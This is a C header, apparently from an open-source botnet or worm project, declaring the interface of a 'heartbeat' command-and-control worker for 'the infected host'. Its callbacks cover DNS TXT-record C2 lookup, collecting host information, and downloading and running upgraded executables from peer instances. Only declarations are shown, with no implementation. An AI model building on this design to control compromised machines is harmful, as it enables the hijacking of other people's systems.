/** \file
 * \brief The heartbeat worker.
 * \note The heartbeat worker is a service that provides a means of controlling
 *	the infected host using the protocol of the same name. Two internal threads
 *	are launched to serve LBD and TXT REC CNC.
 */
/*
* Copyright (c) 2019-2022 David Timber <dxdt@dev.snart.me>
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/
#pragma once
#include "pth.h"
#include "resolv.h"
#include "protocol.h"
#include "pack.h"

#include <mbedtls/ssl.h>


// The heartbeat worker handle (opaque)
struct prne_htbt;
/* Alias declarations */
typedef struct prne_htbt prne_htbt_t;
typedef struct prne_htbt_param prne_htbt_param_t;
typedef struct prne_htbt_cbset prne_htbt_cbset_t;

typedef bool(*prne_htbt_cnc_txtrec_ft)(void *ctx, char *out);
typedef bool(*prne_htbt_hostinfo_ft)(void *ctx, prne_htbt_host_info_t *out);
typedef int(*prne_htbt_tmpfile_ft)(
	void *ctx,
	const int flags,
	const mode_t mode,
	size_t req_size,
	char **path);
typedef bool(*prne_htbt_bin_ft)(
	void *ctx,
	const char *path,
	const prne_htbt_cmd_t *cmd);
typedef bool(*prne_htbt_fork_ft)(void *ctx);

/**
 * \brief The heartbeat callback set object.
 */
struct prne_htbt_cbset {
	/**
	 * \brief CNC TXT REC name callback (optional)
	 * \param ctx \c cb_ctx
	 * \param[out] out The pointer to the 256-elements-long array. The maximum
	 *	possible length of the name of the CNC TXT REC is 255 characters. The
	 *	string must be null-terminated.
	 * \retval true if the contents of \p out are successfully set.
	 * \retval false otherwise. \c errno may be used to indicate the error
	 *	occurred during the process.
	 */
	prne_htbt_cnc_txtrec_ft cnc_txtrec;
	/**
	 * \brief Hostinfo request callback (optional)
	 * \param ctx \c cb_ctx
	 * \param[out] out The pointer to the initialised hostinfo object. The user
	 *	implementation has to provide all the information available via this
	 *	object.
	 * \retval true if the members of \p out are successfully set.
	 * \retval false otherwise. \c errno may be used to indicate the error
	 *	occurred during the process.
	 */
	prne_htbt_hostinfo_ft hostinfo;
	/**
	 * \brief Create temporary file request callback (optional)
	 * \param ctx \c cb_ctx
	 * \param flags \c open() flags.
	 * \param mode \c open() mode.
	 * \param req_size The initial size of the temporary file.
	 * \param path (optional)null-terminated string, the path to the
	 * 	temporary file created. If used, the memory must be freeable with
	 * 	\c prne_free()
	 * \return An open and valid file descriptor upon successful creation of
	 * 	temporary file.
	 * \retval A negative integer with \c errno set to an appropriate value.
	 *
	 * \note
	 * This is the callback function that the worker uses to create
	 * temporary files. The user implementation should determine the path of
	 * the new temporary file using its own resources. The file should be
	 * grown to \p req_size using syscalls like \c fallocate(). The file may
	 * contain "holes". Any \c errno resulted during the process must be
	 * preserved when the function has returned so that the worker can
	 * respectively return the error in the \c prne_bne_result_t object.
	 * A temporary file is created to download a new version of executable.
	 */
	prne_htbt_tmpfile_ft tmpfile;
	/**
	 * \brief Binary upgrade event callback (optional)
	 * \param ctx \c cb_ctx
	 * \param path The path to the new executable.
	 * \param cmd The command line arguments without the first element,
	 * 	which is the path to the executable.
	 * \retval True if the new executable is accepted and no error has
	 * 	occurred during the process.
	 * \retval False otherwise with \c errno set to explain why the
	 * executable has not been accepted.
	 *
	 * \note
	 * This function is called by the worker upon the successful download of
	 * a new version of executable from another instance. The mode of the
	 * file at \p path is set so that it is executable. \p cmd is the
	 * command line options to be used when launching the executable. Note
	 * that an array for \c exec() should be composed as the first element
	 * of \p cmd is not \p path.
	 */
	prne_htbt_bin_ft upbin;
	struct {
		/**
		 * \brief Fork prepare event callback (optional)
		 * \param ctx \c cb_ctx
		 * \retval true if preparation for fork() has been successful.
		 * \retval false otherwise with \c errno set to an appropriate value.
		 * \note This is the equivalent of the "prepare" argument to
		 *	\c pthread_atfork()
		 * \see PTHREAD_ATFORK(3)
		 */
		prne_htbt_fork_ft prepare;
		/**
		 * \brief Fork parent event callback (optional)
		 * \param ctx \c cb_ctx
		 * \retval true if the set up process for the parent process has been
		 *	successful.
		 * \retval false otherwise with \c errno set to an appropriate value.
		 * \note This is the equivalent of the "parent" argument to
		 *	\c pthread_atfork()
		 * \see PTHREAD_ATFORK(3)
		 */
		prne_htbt_fork_ft parent;
		/**
		 * \brief Fork child event callback (optional)
		 * \param ctx \c cb_ctx
		 * \retval true if the set up process for the child process has been
		 *	successful.
		 * \retval false otherwise with \c errno set to an appropriate value.
		 * \note This is the equivalent of the "child" argument to
		 *	\c pthread_atfork()
		 * \see PTHREAD_ATFORK(3)
		 */
		prne_htbt_fork_ft child;
	} fork;
};

/**
 * \brief The heartbeat worker parameter object.
 * \warning The referenced objects must be valid until the worker is freed.
 * \note All of the members are required.
 * \see \c prne_htbt_init_param()
 * \see \c prne_htbt_free_param()
 */
struct prne_htbt_param {
	// The TLS config object for the LBD port
	mbedtls_ssl_config *lbd_ssl_conf;
	// The TLS config for the "main" internal thread
	mbedtls_ssl_config *main_ssl_conf;
	// The CTR_DRBG object for jitters and protocol message ids
	mbedtls_ctr_drbg_context *ctr_drbg;
	// The resolv worker for CNCP
	prne_resolv_t *resolv;
	// The callback function set
	prne_htbt_cbset_t cb_f;
	// The callback context
	void *cb_ctx;
	// The binary recombination parameter object
	const prne_rcb_param_t *rcb;
	/**
	 * \brief The "blackhole" file descriptor.
	 * \note
	 * To maintain the internal IO abstration layer, a file descriptor that's
	 * always writeable(POLLOUT) is required. The purpose of the file descriptor
	 * is to make \c poll() return immediately. No data is actually written to
	 * the file descriptor.
	 * \note Either the null device or a file descriptor pair of a anonymous
	 *	pipe can be used.
	 */
	int blackhole;
};


/**
 * \brief Allocate and start the heartbeat worker.
 * \param w The pointer to the pth worker object.
 * \param param The pointer to the heartbeat worker parameter object.
 * \return The pointer to the instantiated heartbeat worker.
 * \retval NULL on error with \c errno set.
 * \note The worker keeps its own copy of \p param. The memory used for \p param
 * 	can be freed after the function returns.
 * \note The thread can be controlled with \p w.
 */
prne_htbt_t *prne_alloc_htbt (prne_worker_t *w, const prne_htbt_param_t *param);

/**
 * \brief Initialisation function
 * \see [/doc/impl.md#Resource Allocation](/doc/impl.md#resource_allocation)
 */
void prne_htbt_init_param (prne_htbt_param_t *p);
/**
 * \brief Deinitialisation function
 * \see [/doc/impl.md#Resource Allocation](/doc/impl.md#resource_allocation)
 */
void prne_htbt_free_param (prne_htbt_param_t *p);
